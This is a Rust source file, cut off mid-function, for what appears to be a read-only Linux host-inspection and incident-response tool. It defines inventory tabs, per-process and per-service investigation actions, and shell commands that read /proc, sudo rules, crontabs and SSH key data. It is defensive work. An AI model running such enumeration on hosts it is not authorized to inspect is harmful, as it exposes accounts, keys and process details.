//! Read-only, target-bound Linux system inventory.
//!
//! Inventory commands are static. Typed detail requests derive validated keys
//! from collected rows and shell-quote every dynamic argument. Remote output is
//! bounded before it crosses the core boundary and is never interpreted as HTML
//! or a follow-up command.

use std::{
    collections::BTreeMap,
    net::{IpAddr, Ipv4Addr},
    sync::Arc,
    time::Duration,
};

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use uuid::Uuid;

use crate::{
    CoreError, CoreResult,
    operations::{
        DangerousConfirmation, ExecutionReceipt, OperationExecutor, OperationJournal,
        OperationPlan, OperationState, PlannedOperation, VerificationResult,
    },
    sftp::{
        MAX_EDIT_BYTES, RemotePath, SftpMutation, SftpPlannedOperation, SftpService, content_sha256,
    },
    shell_escape::{is_valid_pid, is_valid_username, shq},
    ssh::{BoundSshSession, SshService},
    target::TargetContext,
};

const MAX_ROWS: usize = 1_000;
const MAX_CELL_CHARS: usize = 4_096;
const MAX_SUMMARY_CHARS: usize = 512;
const MAX_PROCESS_INVESTIGATION_CHARS: usize = 131_072;
const MAX_SERVICE_INVESTIGATION_CHARS: usize = 131_072;
const MAX_NETWORK_INVESTIGATION_CHARS: usize = 131_072;
const MAX_USER_INVESTIGATION_CHARS: usize = 131_072;
const MAX_LOGIN_INVESTIGATION_CHARS: usize = 131_072;
const MAX_ARTIFACT_INVESTIGATION_CHARS: usize = 131_072;

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoTab {
    Processes,
    Network,
    Services,
    Established,
    OpenPorts,
    Users,
    Autostart,
    Cron,
    SshKeys,
    LoginHistory,
    SuidFiles,
    Autoruns,
    Firewall,
    EnvVars,
    ShellConfigs,
    Packages,
    Sudoers,
    Timers,
    KernelModules,
    Rootcheck,
    Sensitive,
    RecentFiles,
    Docker,
    Kubernetes,
    WebApps,
}

impl SystemInfoTab {
    pub const ALL: [Self; 25] = [
        Self::Processes,
        Self::Network,
        Self::Services,
        Self::Established,
        Self::OpenPorts,
        Self::Users,
        Self::Autostart,
        Self::Cron,
        Self::SshKeys,
        Self::LoginHistory,
        Self::SuidFiles,
        Self::Autoruns,
        Self::Firewall,
        Self::EnvVars,
        Self::ShellConfigs,
        Self::Packages,
        Self::Sudoers,
        Self::Timers,
        Self::KernelModules,
        Self::Rootcheck,
        Self::Sensitive,
        Self::RecentFiles,
        Self::Docker,
        Self::Kubernetes,
        Self::WebApps,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Processes => "进程详情",
            Self::Network => "网络详情",
            Self::Services => "系统服务",
            Self::Established => "外连排查",
            Self::OpenPorts => "开放端口",
            Self::Users => "用户列表",
            Self::Autostart => "自启动",
            Self::Cron => "计划任务",
            Self::SshKeys => "SSH 密钥",
            Self::LoginHistory => "登录历史",
            Self::SuidFiles => "SUID 文件",
            Self::Autoruns => "启动项汇总",
            Self::Firewall => "防火墙",
            Self::EnvVars => "环境变量",
            Self::ShellConfigs => "Shell 配置",
            Self::Packages => "软件包",
            Self::Sudoers => "Sudoers",
            Self::Timers => "定时器",
            Self::KernelModules => "内核模块",
            Self::Rootcheck => "Rootkit 检查",
            Self::Sensitive => "敏感文件",
            Self::RecentFiles => "最近文件",
            Self::Docker => "Docker",
            Self::Kubernetes => "Kubernetes",
            Self::WebApps => "Web 应用",
        }
    }

    pub const fn group(self) -> SystemInfoGroup {
        match self {
            Self::Processes
            | Self::Network
            | Self::Services
            | Self::Established
            | Self::OpenPorts => SystemInfoGroup::Realtime,
            Self::Users
            | Self::Autostart
            | Self::Cron
            | Self::SshKeys
            | Self::LoginHistory
            | Self::SuidFiles
            | Self::Autoruns => SystemInfoGroup::Persistence,
            Self::Firewall
            | Self::EnvVars
            | Self::ShellConfigs
            | Self::Packages
            | Self::Sudoers
            | Self::Timers
            | Self::KernelModules
            | Self::Rootcheck
            | Self::Sensitive
            | Self::RecentFiles => SystemInfoGroup::Security,
            Self::Docker | Self::Kubernetes | Self::WebApps => SystemInfoGroup::Workload,
        }
    }

    pub const fn columns(self) -> &'static [&'static str] {
        match self {
            Self::Processes => &[
                "风险",
                "PID",
                "PPID",
                "用户",
                "状态",
                "CPU%",
                "内存%",
                "运行秒数",
                "命令",
            ],
            Self::Network => &["协议", "本地地址", "远程地址", "状态", "PID", "进程"],
            Self::Services => &["服务名", "状态", "启用状态", "描述"],
            Self::Established => &["本地地址", "远程地址", "远程端口", "PID", "进程", "用户"],
            Self::OpenPorts => &["协议", "地址", "端口", "PID", "进程", "用户"],
            Self::Users => &["用户名", "UID", "GID", "主目录", "Shell"],
            Self::Autostart => &["服务名", "命令", "状态", "类型"],
            Self::Cron => &["用户", "时间表", "命令", "来源"],
            Self::SshKeys => &["用户", "密钥类型", "公钥内容", "备注", "文件路径"],
            Self::LoginHistory => &["用户", "终端", "来源 IP", "登录时间", "状态"],
            Self::SuidFiles => &["文件路径", "权限", "所有者", "大小", "修改时间", "风险"],
            Self::Autoruns => &["类型", "名称", "状态", "路径/命令", "用户"],
            Self::Firewall => &["链", "目标", "协议", "源地址", "目标地址", "选项"],
            Self::EnvVars => &["变量名", "值", "风险"],
            Self::ShellConfigs => &["文件", "所有者", "修改时间", "行号", "内容", "风险"],
            Self::Packages => &["软件包名", "版本", "安装时间", "来源"],
            Self::Sudoers => &["用户/组", "主机", "命令", "免密", "来源"],
            Self::Timers => &["定时器", "下次触发", "剩余时间", "上次触发", "触发单元"],
            Self::KernelModules => &["模块名", "大小", "引用计数", "风险"],
            Self::Rootcheck => &["检查项", "结果", "详情"],
            Self::Sensitive => &["文件路径", "类型", "权限", "所有者", "修改时间"],
            Self::RecentFiles => &["文件路径", "修改时间", "大小", "所有者", "风险"],
            Self::Docker => &["ID", "名称", "镜像", "状态", "端口", "创建时间"],
            Self::Kubernetes => &["Namespace", "名称", "Ready", "状态", "重启", "Age"],
            Self::WebApps => &["类型", "路径/URL", "状态", "配置文件", "运行用户"],
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Sensitive | Self::RecentFiles | Self::SuidFiles | Self::Rootcheck => {
                Duration::from_secs(45)
            }
            _ => Duration::from_secs(20),
        }
    }

    const fn command(self) -> &'static str {
        match self {
            Self::Processes => PROCESS_COMMAND,
            Self::Network => NETWORK_COMMAND,
            Self::Services => SERVICES_COMMAND,
            Self::Established => ESTABLISHED_COMMAND,
            Self::OpenPorts => OPEN_PORTS_COMMAND,
            Self::Users => USERS_COMMAND,
            Self::Autostart => AUTOSTART_COMMAND,
            Self::Cron => CRON_COMMAND,
            Self::SshKeys => SSH_KEYS_COMMAND,
            Self::LoginHistory => LOGIN_HISTORY_COMMAND,
            Self::SuidFiles => SUID_COMMAND,
            Self::Autoruns => AUTORUNS_COMMAND,
            Self::Firewall => FIREWALL_COMMAND,
            Self::EnvVars => ENV_COMMAND,
            Self::ShellConfigs => SHELL_CONFIG_COMMAND,
            Self::Packages => PACKAGES_COMMAND,
            Self::Sudoers => SUDOERS_COMMAND,
            Self::Timers => TIMERS_COMMAND,
            Self::KernelModules => KERNEL_MODULES_COMMAND,
            Self::Rootcheck => ROOTCHECK_COMMAND,
            Self::Sensitive => SENSITIVE_COMMAND,
            Self::RecentFiles => RECENT_FILES_COMMAND,
            Self::Docker => DOCKER_COMMAND,
            Self::Kubernetes => KUBERNETES_COMMAND,
            Self::WebApps => WEB_APPS_COMMAND,
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoGroup {
    Realtime,
    Persistence,
    Security,
    Workload,
}

impl SystemInfoGroup {
    pub const ALL: [Self; 4] = [
        Self::Realtime,
        Self::Persistence,
        Self::Security,
        Self::Workload,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Realtime => "实时态势",
            Self::Persistence => "账户与持久化",
            Self::Security => "安全与痕迹",
            Self::Workload => "工作负载",
        }
    }
}

#[derive(Debug, Clone, Copy, Default, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SystemInfoRisk {
    #[default]
    Normal,
    Warning,
    High,
}

impl SystemInfoRisk {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Normal => "正常",
            Self::Warning => "可疑",
            Self::High => "高危",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoRequest {
    pub tab: SystemInfoTab,
    pub maximum_rows: usize,
}

impl SystemInfoRequest {
    pub fn new(tab: SystemInfoTab, maximum_rows: usize) -> CoreResult<Self> {
        if !(1..=MAX_ROWS).contains(&maximum_rows) {
            return Err(CoreError::Validation {
                subject: "system information row limit",
                message: format!("must be between 1 and {MAX_ROWS}"),
            });
        }
        Ok(Self { tab, maximum_rows })
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoRow {
    pub id: String,
    pub cells: Vec<String>,
    pub risk: SystemInfoRisk,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoTable {
    pub tab: SystemInfoTab,
    pub columns: Vec<String>,
    pub rows: Vec<SystemInfoRow>,
    pub truncated: bool,
}

impl SystemInfoTable {
    /// Build a detail request only from a row that belongs to this typed result.
    /// Callers cannot combine an arbitrary row id with unvalidated shell input.
    pub fn detail_request(&self, row_id: &str) -> CoreResult<Option<SystemInfoDetailRequest>> {
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        SystemInfoDetailRequest::from_row(self.tab, row)
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct SystemInfoDetailRequest {
    tab: SystemInfoTab,
    row_id: String,
    key: SystemInfoDetailKey,
}

#[derive(Debug, Clone, Eq, PartialEq)]
enum SystemInfoDetailKey {
    Process { pid: u32 },
    Service { name: String },
    User { username: String },
    SshKey { key_line: String },
    SuidFile { path: String },
    Package { name: String },
    KernelModule { name: String },
    RecentFile { path: String },
}

impl SystemInfoDetailRequest {
    fn from_row(tab: SystemInfoTab, row: &SystemInfoRow) -> CoreResult<Option<Self>> {
        let cell = |index: usize| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| CoreError::Validation {
                    subject: "system information detail row",
                    message: format!("missing required column {index}"),
                })
        };
        let key = match tab {
            SystemInfoTab::Processes => {
                let value = cell(1)?;
                if !is_valid_pid(value) {
                    return Err(invalid_detail_key("process PID"));
                }
                SystemInfoDetailKey::Process {
                    pid: value
                        .parse()
                        .map_err(|_| invalid_detail_key("process PID"))?,
                }
            }
            SystemInfoTab::Services => {
                let name = cell(0)?;
                if !is_valid_unit_name(name) {
                    return Err(invalid_detail_key("systemd unit name"));
                }
                SystemInfoDetailKey::Service {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::Users => {
                let username = cell(0)?;
                if !is_valid_username(username) {
                    return Err(invalid_detail_key("Linux username"));
                }
                SystemInfoDetailKey::User {
                    username: username.to_owned(),
                }
            }
            SystemInfoTab::SshKeys => {
                let key_type = cell(1)?;
                let key_content = cell(2)?;
                let comment = cell(3)?;
                if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
                    return Err(invalid_detail_key("SSH public key"));
                }
                let key_line = bounded_text(
                    &format!("{key_type} {key_content} {comment}"),
                    MAX_CELL_CHARS,
                );
                SystemInfoDetailKey::SshKey { key_line }
            }
            SystemInfoTab::SuidFiles => SystemInfoDetailKey::SuidFile {
                path: validated_absolute_path(cell(0)?)?,
            },
            SystemInfoTab::Packages => {
                let name = cell(0)?;
                if !is_valid_package_name(name) {
                    return Err(invalid_detail_key("package name"));
                }
                SystemInfoDetailKey::Package {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::KernelModules => {
                let name = cell(0)?;
                if !is_valid_module_name(name) {
                    return Err(invalid_detail_key("kernel module name"));
                }
                SystemInfoDetailKey::KernelModule {
                    name: name.to_owned(),
                }
            }
            SystemInfoTab::RecentFiles => SystemInfoDetailKey::RecentFile {
                path: validated_absolute_path(cell(0)?)?,
            },
            _ => return Ok(None),
        };
        Ok(Some(Self {
            tab,
            row_id: row.id.clone(),
            key,
        }))
    }

    fn command(&self) -> String {
        match &self.key {
            SystemInfoDetailKey::Process { pid } => {
                let pid = shq(&pid.to_string());
                format!(
                    "p={pid}; printf 'Parent PID\\t'; ps -o ppid= -p \"$p\" 2>/dev/null | xargs; \
printf 'Parent Process\\t'; pp=$(ps -o ppid= -p \"$p\" 2>/dev/null | xargs); [ -n \"$pp\" ] && ps -o comm= -p \"$pp\" 2>/dev/null; \
printf 'PGID\\t'; ps -o pgid= -p \"$p\" 2>/dev/null | xargs; \
printf 'SID\\t'; ps -o sid= -p \"$p\" 2>/dev/null | xargs; \
printf 'Priority\\t'; ps -o pri= -p \"$p\" 2>/dev/null | xargs; \
printf 'Threads\\t'; ls \"/proc/$p/task\" 2>/dev/null | wc -l; \
printf 'Command Line\\t'; tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null | head -c 2048; printf '\\n'; \
printf 'Working Directory\\t'; readlink \"/proc/$p/cwd\" 2>/dev/null; \
printf 'Executable\\t'; readlink \"/proc/$p/exe\" 2>/dev/null; \
printf 'UID / GID\\t'; awk '/^(Uid|Gid):/{{printf \"%s=%s/%s/%s/%s \",$1,$2,$3,$4,$5}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null; \
printf 'Capabilities\\t'; awk '/^Cap(Inh|Prm|Eff|Bnd|Amb):/{{printf \"%s=%s \",$1,$2}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null; \
printf 'Memory\\t'; awk '/^(VmPeak|VmSize|VmRSS|RssAnon|VmSwap):/{{printf \"%s=%s%s \",$1,$2,$3}} END{{print \"\"}}' \"/proc/$p/status\" 2>/dev/null; \
printf 'I/O\\t'; awk '/^(read_bytes|write_bytes|syscr|syscw):/{{printf \"%s=%s \",$1,$2}} END{{print \"\"}}' \"/proc/$p/io\" 2>/dev/null; \
printf 'Open File Descriptors\\t'; find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | wc -l; \
printf 'Cgroup\\t'; head -n 8 \"/proc/$p/cgroup\" 2>/dev/null | tr '\\n\\t' '  '; printf '\\n'; \
printf 'Children\\t'; pgrep -P \"$p\" 2>/dev/null | paste -sd ',' -; \
printf 'Deleted Executable\\t'; readlink \"/proc/$p/exe\" 2>/dev/null | grep -q ' (deleted)$' && printf 'yes\\n' || printf 'no\\n'; \
printf 'Network Sockets\\t'; ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | head -n 8 | tr '\\n\\t' '  '; printf '\\n'"
                )
            }
            SystemInfoDetailKey::Service { name } => {
                let name = shq(name);
                format!(
                    "n={name}; systemctl show \"$n\" --no-pager -p Description -p ActiveState -p SubState -p UnitFileState -p MainPID -p User -p Group -p MemoryCurrent -p CPUUsageNSec -p FragmentPath -p ExecStart -p WorkingDirectory -p EnvironmentFiles -p Requires -p Wants -p After -p TriggeredBy 2>/dev/null | awk -F= '{{v=substr($0,index($0,\"=\")+1); gsub(/\\t/,\" \",v); print $1\"\\t\"v}}'; \
printf 'Recent Warnings\\t'; journalctl -u \"$n\" -p warning -n 5 --no-pager 2>/dev/null | tr '\\n\\t' '  '; printf '\\n'"
                )
            }
            SystemInfoDetailKey::User { username } => {
                let username = shq(username);
                format!(
                    "u={username}; printf 'Account\\t'; getent passwd \"$u\" 2>/dev/null | awk -F: '{{print \"UID=\" $3 \" GID=\" $4 \" Home=\" $6 \" Shell=\" $7}}'; \
printf 'Groups\\t'; id -nG \"$u\" 2>/dev/null; \
printf 'Password Status\\t'; passwd -S \"$u\" 2>/dev/null; \
printf 'Sudo Rules\\t'; sudo -nl -U \"$u\" 2>/dev/null | tail -n +2 | tr '\\n\\t' '  '; printf '\\n'; \
printf 'Last Login\\t'; lastlog -u \"$u\" 2>/dev/null | tail -n 1; \
printf 'Active Sessions\\t'; who 2>/dev/null | awk -v u=\"$u\" '$1==u{{n++}} END{{print n+0}}'; \
printf 'Process Count\\t'; pgrep -u \"$u\" 2>/dev/null | wc -l; \
printf 'Cron Entries\\t'; crontab -u \"$u\" -l 2>/dev/null | awk 'NF && $1 !~ /^#/ {{n++}} END{{print n+0}}'; \
printf 'Authorized Keys\\t'; h=$(getent passwd \"$u\" 2>/dev/null | cut -d: -f6); [ -n \"$h\" ] && awk 'NF>=2 && $1 !~ /^#/ {{n++}} END{{print n+0}}' \"$h/.ssh/authorized_keys\" 2>/dev/null"
                )
            }
            SystemInfoDetailKey::SshKey { key_line } => {
                let key_line = shq(key_line);
                format!(
                    "printf '%s\\n' {key_line} | ssh-keygen -lf - 2>/dev/null | sed 's/^/Fingerprint\\t/'"
                )
            }
            SystemInfoDetailKey::SuidFile { path } | SystemInfoDetailKey::RecentFile { path } => {
                file_detail_command(path)
            }
            SystemInfoDetailKey::Package { name } => {
                let name = shq(name);
                format!(
                    "p={name}; if command -v dpkg >/dev/null 2>&1; then \
printf 'Status\\t'; dpkg-query -W -f='${{db:Status-Abbrev}}\\n' \"$p\" 2>/dev/null; \
printf 'Architecture\\t'; dpkg-query -W -f='${{Architecture}}\\n' \"$p\" 2>/dev/null; \
printf 'Installed Size KiB\\t'; dpkg-query -W -f='${{Installed-Size}}\\n' \"$p\" 2>/dev/null; \
printf 'Dependencies\\t'; dpkg-query -W -f='${{Depends}}\\n' \"$p\" 2>/dev/null; \
printf 'Installed Files\\t'; dpkg -L \"$p\" 2>/dev/null | wc -l; \
else printf 'Status\\t'; rpm -q \"$p\" 2>/dev/null; \
printf 'Dependencies\\t'; rpm -qR \"$p\" 2>/dev/null | head -n 32 | tr '\\n\\t' '  '; printf '\\n'; \
printf 'Installed Files\\t'; rpm -ql \"$p\" 2>/dev/null | wc -l; fi"
                )
            }
            SystemInfoDetailKey::KernelModule { name } => {
                let name = shq(name);
                format!(
                    "m={name}; printf 'Description\\t'; modinfo -F description \"$m\" 2>/dev/null; \
printf 'File\\t'; modinfo -F filename \"$m\" 2>/dev/null; \
printf 'Signer\\t'; modinfo -F signer \"$m\" 2>/dev/null; \
printf 'Dependencies\\t'; modinfo -F depends \"$m\" 2>/dev/null"
                )
            }
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoDetailField {
    pub label: String,
    pub value: String,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoDetail {
    pub tab: SystemInfoTab,
    pub row_id: String,
    pub fields: Vec<SystemInfoDetailField>,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessInvestigationGroup {
    Basics,
    Identity,
    FilesAndMemory,
    Network,
    Relationships,
    Performance,
    Runtime,
    Security,
}

impl ProcessInvestigationGroup {
    pub const ALL: [Self; 8] = [
        Self::Basics,
        Self::Identity,
        Self::FilesAndMemory,
        Self::Network,
        Self::Relationships,
        Self::Performance,
        Self::Runtime,
        Self::Security,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Identity => "用户与权限",
            Self::FilesAndMemory => "文件与内存",
            Self::Network => "网络分析",
            Self::Relationships => "进程关系",
            Self::Performance => "性能分析",
            Self::Runtime => "隔离与运行时",
            Self::Security => "安全检测",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessInvestigationAction {
    CommandLine,
    Executable,
    WorkingDirectory,
    Status,
    Capabilities,
    UidGid,
    OpenFiles,
    MemoryMaps,
    ResourceLimits,
    IoStats,
    MemoryUsage,
    Smaps,
    Environment,
    NetworkConnections,
    ListeningPorts,
    NetworkStatus,
    DnsSockets,
    ProcessTree,
    Children,
    Parent,
    Threads,
    CpuUsage,
    CpuAffinity,
    ContextSwitches,
    OomScore,
    Scheduler,
    SyscallSnapshot,
    KernelStack,
    FileDescriptorStats,
    Signals,
    Namespaces,
    Cgroup,
    Container,
    Uptime,
    SuspiciousPath,
    HiddenProcess,
    LdPreload,
    DeletedExecutable,
    SuspiciousNetwork,
    CryptoMining,
}

impl ProcessInvestigationAction {
    pub const ALL: [Self; 40] = [
        Self::CommandLine,
        Self::Executable,
        Self::WorkingDirectory,
        Self::Status,
        Self::Capabilities,
        Self::UidGid,
        Self::OpenFiles,
        Self::MemoryMaps,
        Self::ResourceLimits,
        Self::IoStats,
        Self::MemoryUsage,
        Self::Smaps,
        Self::Environment,
        Self::NetworkConnections,
        Self::ListeningPorts,
        Self::NetworkStatus,
        Self::DnsSockets,
        Self::ProcessTree,
        Self::Children,
        Self::Parent,
        Self::Threads,
        Self::CpuUsage,
        Self::CpuAffinity,
        Self::ContextSwitches,
        Self::OomScore,
        Self::Scheduler,
        Self::SyscallSnapshot,
        Self::KernelStack,
        Self::FileDescriptorStats,
        Self::Signals,
        Self::Namespaces,
        Self::Cgroup,
        Self::Container,
        Self::Uptime,
        Self::SuspiciousPath,
        Self::HiddenProcess,
        Self::LdPreload,
        Self::DeletedExecutable,
        Self::SuspiciousNetwork,
        Self::CryptoMining,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::CommandLine => "命令行参数",
            Self::Executable => "可执行路径",
            Self::WorkingDirectory => "当前目录",
            Self::Status => "进程状态/权限",
            Self::Capabilities => "Capabilities",
            Self::UidGid => "UID/GID 信息",
            Self::OpenFiles => "打开的文件",
            Self::MemoryMaps => "内存映射",
            Self::ResourceLimits => "资源限制",
            Self::IoStats => "I/O 统计",
            Self::MemoryUsage => "内存使用",
            Self::Smaps => "内存详细信息",
            Self::Environment => "环境变量",
            Self::NetworkConnections => "网络连接",
            Self::ListeningPorts => "监听端口",
            Self::NetworkStatus => "详细网络状态",
            Self::DnsSockets => "DNS 相关套接字",
            Self::ProcessTree => "父子进程树",
            Self::Children => "子进程列表",
            Self::Parent => "父进程信息",
            Self::Threads => "线程数",
            Self::CpuUsage => "CPU 使用率",
            Self::CpuAffinity => "CPU 亲和性",
            Self::ContextSwitches => "上下文切换",
            Self::OomScore => "OOM 分数",
            Self::Scheduler => "调度策略",
            Self::SyscallSnapshot => "系统调用统计",
            Self::KernelStack => "调用栈",
            Self::FileDescriptorStats => "文件描述符统计",
            Self::Signals => "信号处理",
            Self::Namespaces => "Namespace 信息",
            Self::Cgroup => "Cgroup 信息",
            Self::Container => "容器检测",
            Self::Uptime => "运行时长",
            Self::SuspiciousPath => "可疑路径检测",
            Self::HiddenProcess => "隐藏进程检测",
            Self::LdPreload => "LD_PRELOAD 检测",
            Self::DeletedExecutable => "已删除可执行文件",
            Self::SuspiciousNetwork => "可疑网络连接",
            Self::CryptoMining => "挖矿特征检测",
        }
    }

    pub const fn group(self) -> ProcessInvestigationGroup {
        match self {
            Self::CommandLine | Self::Executable | Self::WorkingDirectory => {
                ProcessInvestigationGroup::Basics
            }
            Self::Status | Self::Capabilities | Self::UidGid => ProcessInvestigationGroup::Identity,
            Self::OpenFiles
            | Self::MemoryMaps
            | Self::ResourceLimits
            | Self::IoStats
            | Self::MemoryUsage
            | Self::Smaps
            | Self::Environment => ProcessInvestigationGroup::FilesAndMemory,
            Self::NetworkConnections
            | Self::ListeningPorts
            | Self::NetworkStatus
            | Self::DnsSockets => ProcessInvestigationGroup::Network,
            Self::ProcessTree | Self::Children | Self::Parent | Self::Threads => {
                ProcessInvestigationGroup::Relationships
            }
            Self::CpuUsage
            | Self::CpuAffinity
            | Self::ContextSwitches
            | Self::OomScore
            | Self::Scheduler
            | Self::SyscallSnapshot
            | Self::KernelStack
            | Self::FileDescriptorStats => ProcessInvestigationGroup::Performance,
            Self::Signals | Self::Namespaces | Self::Cgroup | Self::Container | Self::Uptime => {
                ProcessInvestigationGroup::Runtime
            }
            Self::SuspiciousPath
            | Self::HiddenProcess
            | Self::LdPreload
            | Self::DeletedExecutable
            | Self::SuspiciousNetwork
            | Self::CryptoMining => ProcessInvestigationGroup::Security,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::CpuUsage => Duration::from_secs(10),
            _ => Duration::from_secs(20),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessInvestigationRequest {
    row_id: String,
    pid: u32,
    action: ProcessInvestigationAction,
}

impl ProcessInvestigationRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn pid(&self) -> u32 {
        self.pid
    }

    pub const fn action(&self) -> ProcessInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        process_investigation_command(self.pid, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ProcessInvestigationResult {
    pub row_id: String,
    pub pid: u32,
    pub action: ProcessInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ProcessSignal {
    Terminate,
    Kill,
}

impl ProcessSignal {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Terminate => "终止进程（SIGTERM）",
            Self::Kill => "强制终止进程（SIGKILL）",
        }
    }

    const fn shell_name(self) -> &'static str {
        match self {
            Self::Terminate => "TERM",
            Self::Kill => "KILL",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ProcessIdentitySnapshot {
    pub pid: u32,
    pub start_time_ticks: u64,
    pub command_name: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalPlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: ProcessIdentitySnapshot,
    signal: ProcessSignal,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalRequest {
    row_id: String,
    pid: u32,
    signal: ProcessSignal,
}

impl ProcessSignalRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn pid(&self) -> u32 {
        self.pid
    }

    pub const fn signal(&self) -> ProcessSignal {
        self.signal
    }
}

impl ProcessSignalPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &ProcessIdentitySnapshot {
        &self.snapshot
    }

    pub const fn signal(&self) -> ProcessSignal {
        self.signal
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ProcessSignalOutcome {
    pub pid: u32,
    pub signal: ProcessSignal,
    pub verification: VerificationResult,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceInvestigationGroup {
    Basics,
    Logs,
    Dependencies,
    Resources,
    Security,
    Advanced,
}

impl ServiceInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::Basics,
        Self::Logs,
        Self::Dependencies,
        Self::Resources,
        Self::Security,
        Self::Advanced,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Logs => "日志查询",
            Self::Dependencies => "依赖分析",
            Self::Resources => "资源监控",
            Self::Security => "安全分析",
            Self::Advanced => "高级信息",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceInvestigationAction {
    Status,
    Configuration,
    Details,
    Logs,
    ErrorLogs,
    LiveLogs,
    Dependencies,
    ReverseDependencies,
    ServiceTree,
    CpuUsage,
    MemoryUsage,
    ProcessList,
    OpenFiles,
    RunUser,
    Permissions,
    SecurityCheck,
    ServiceFile,
    Timers,
    Environment,
}

impl ServiceInvestigationAction {
    pub const ALL: [Self; 19] = [
        Self::Status,
        Self::Configuration,
        Self::Details,
        Self::Logs,
        Self::ErrorLogs,
        Self::LiveLogs,
        Self::Dependencies,
        Self::ReverseDependencies,
        Self::ServiceTree,
        Self::CpuUsage,
        Self::MemoryUsage,
        Self::ProcessList,
        Self::OpenFiles,
        Self::RunUser,
        Self::Permissions,
        Self::SecurityCheck,
        Self::ServiceFile,
        Self::Timers,
        Self::Environment,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Status => "服务状态",
            Self::Configuration => "查看配置文件",
            Self::Details => "服务详细信息",
            Self::Logs => "查看服务日志",
            Self::ErrorLogs => "查看错误日志",
            Self::LiveLogs => "实时日志（8 秒）",
            Self::Dependencies => "查看依赖服务",
            Self::ReverseDependencies => "查看被依赖服务",
            Self::ServiceTree => "查看服务树",
            Self::CpuUsage => "CPU 使用率",
            Self::MemoryUsage => "内存使用",
            Self::ProcessList => "进程列表",
            Self::OpenFiles => "打开的文件",
            Self::RunUser => "查看运行用户",
            Self::Permissions => "查看权限配置",
            Self::SecurityCheck => "配置安全性检查",
            Self::ServiceFile => "查看服务文件",
            Self::Timers => "查看定时器配置",
            Self::Environment => "查看环境变量",
        }
    }

    pub const fn group(self) -> ServiceInvestigationGroup {
        match self {
            Self::Status | Self::Configuration | Self::Details => ServiceInvestigationGroup::Basics,
            Self::Logs | Self::ErrorLogs | Self::LiveLogs => ServiceInvestigationGroup::Logs,
            Self::Dependencies | Self::ReverseDependencies | Self::ServiceTree => {
                ServiceInvestigationGroup::Dependencies
            }
            Self::CpuUsage | Self::MemoryUsage | Self::ProcessList | Self::OpenFiles => {
                ServiceInvestigationGroup::Resources
            }
            Self::RunUser | Self::Permissions | Self::SecurityCheck => {
